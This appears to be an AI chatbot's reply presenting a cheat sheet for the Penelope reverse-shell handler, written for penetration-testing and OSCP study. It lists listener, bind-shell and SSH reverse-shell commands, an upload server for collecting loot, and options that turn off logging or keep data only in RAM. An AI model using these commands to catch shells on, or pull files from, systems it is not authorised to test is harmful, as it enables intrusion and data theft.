Here is the **Penelope Shell Handler** module distilled into the exact same clean, Obsidian-ready, attacker-use format. 

Zero fluff. Pure workflow, commands, and operational tactics.

---

```md
## 🧠 Penelope Shell Handler Cheat Sheet

---

### 🎯 1. Core Concept

> [!INFO]
> **Goal:** Replace basic `netcat` listeners with a modern, feature-rich shell handler.
> **Mechanism:** A standalone Python tool that provides **automatic PTY upgrades**, session management, built-in file transfer, in-memory script execution, and session logging out of the box.

---

### 🧪 2. Quick Installation

```bash
# Kali Linux (Recommended)
sudo apt update && sudo apt install penelope

# Standalone (No dependencies, runs anywhere with Python 3.6+)
wget -q https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py
python3 penelope.py

# Pipx (Latest stable release)
pipx install penelope-shell-handler
```

---

### 🧬 3. Listener & Connection Commands

#### 🔹 Reverse Shell Listeners
```bash
penelope                      # Default: Listen on 0.0.0.0:4444
penelope -p 5555              # Listen on specific port
penelope -p 4444,5555         # Listen on multiple ports
penelope -i eth0 -p 5555      # Bind to specific interface/IP
penelope -a                   # 🌟 GOLD: Print ready-to-use reverse shell payloads for active listeners
```

#### 🔹 Bind Shell & SSH Reverse
```bash
# Connect to a bind shell
penelope -c <TARGET_IP> -p 3333

# Force a reverse shell via SSH (great for pivoting)
penelope ssh user@target
penelope -p 5555 ssh user@target
penelope -i eth0 -p 5555 -- ssh -l user -p 2222 target  # Use '--' for complex SSH args
```

---

### 💥 4. Built-in HTTP File Server

Drop `python3 -m http.server` and `wget`. Penelope handles both serving and receiving.

```bash
# Serve a single file or directory (Default port 8000)
penelope -s file.txt
penelope -s /path/to/dir
penelope -s . -p 80

# Serve multiple specific items
penelope -s a.sh b.elf notes.txt

# 🌟 Upload Mode: Accept PUT/POST requests into Current Working Directory
penelope -s -u

# Upload Mode with custom destination directory
penelope -s -u -ud /tmp/loot

# Hide behind a URL prefix (e.g., http://IP/xk9/secret.txt)
penelope -s secret.txt -prefix xk9
```
> [!SUCCESS]  
> On startup, Penelope prints ready-to-use `curl`/`wget` commands for the target, saving you from typing them manually.

---

### 🔍 5. Session Management & Controls

> [!ATTENTION] **Detaching from Shells**
> To return to the Penelope Main Menu from an active shell, use the correct detach key based on the shell type:
> - **PTY Shell:** Press `F12`
> - **Readline Shell:** Send EOF (`Ctrl+D`)
> - **Raw Shell:** Send SIGINT (`Ctrl+C`)
> *(The correct key is always displayed at the top of the attached session).*

#### 🔹 Main Menu Shortcuts
- **Tab Completion:** Fully supported for all commands.
- **Short Commands:** Type `i 1` instead of `interact 1`.
- **Logging:** All session activity is automatically logged to disk with timestamps (unless disabled).

---

### ⚙️ 6. Advanced CLI Flags (Operator Tweaks)

```bash
# 🛡️ OSCP-Safe Mode (Disables auto-exploitation modules like Traitor)
penelope -O

# 💾 RAM-Only Mode (No logs or state written to disk, uses tmpfs)
penelope --no-disk

# 🔄 Session Maintenance (Auto-respawn N shells per host if they die)
penelope -m 3

# 🚫 Disable Auto-Upgrade (Keep raw shell, no PTY attempt)
penelope -U

# 📝 Disable Logging (For highly sensitive engagements)
penelope -L

# 🖥️ Start directly in Main Menu (Don't auto-attach to first shell)
penelope -M
```

---

### 🧠 7. Feature Matrix (Unix vs. Windows Targets)

| Feature | Unix-like Target | Windows Target |
| :--- | :---: | :---: |
| Auto-upgrade shell | ✅ PTY | ⚠️ Readline (Manual PTY via `upgrade`) |
| Real-time terminal resize | ✅ Yes | ❌ No |
| Logging shell activity | ✅ Yes | ✅ Yes |
| Download remote files/folders | ✅ Yes | ✅ Yes |
| Upload local/HTTP files | ✅ Yes | ✅ Yes |
| In-memory script execution | ✅ Yes | ❌ No |
| Local port forwarding | ✅ Yes | ❌ No |
| Auto-maintain N active shells | ✅ Yes | ❌ No |

---

## ⚠️ Operator Notes

> [!FAILURE]

If Penelope behaves unexpectedly:
- **Stuck in shell:** You are likely in a raw shell. Press `Ctrl+C` to detach to the Main Menu.
- **Working directory mismatch:** If you `su` or `sudo` inside the shell, Penelope's upload/download paths may break. **Fix:** `cd /tmp` before escalating, or spawn a *new* reverse shell as the new user.
- **Corrupted logs:** Commands using alternate buffers (like `nano` or `vim`) may leave escape sequences in the `.log` file. The data is there, but `cat` might look messy. Use `less -R` to view logs properly.

> [!ATTENTION] **OSCP & Exam Rules**
> Penelope's core shell handling is **OSCP-approved**. However:
> 1. Always use the `-O` (`--oscp-safe`) flag to be safe.
> 2. The `meterpreter` and `traitor` (auto-privilege escalation) modules may violate exam rules. Avoid them unless explicitly permitted.
> 3. Verify current OffSec rules before exam day.

> [!ATTENTION] **Security Warning**
> Terminal escape sequences are forwarded directly to your terminal. Malicious targets can attempt terminal emulation attacks (e.g., clipboard manipulation, misleading links). Use a hardened terminal emulator when attacking untrusted environments.
```

---

### 🔥 Ready for the next target.
This Penelope cheat sheet is locked in. Drop the next module text (e.g., **SSRF**, **SSTI**, **Command Injection**, **Deserialization**) and I will compress it into this exact same high-yield, Obsidian-ready format. 🎯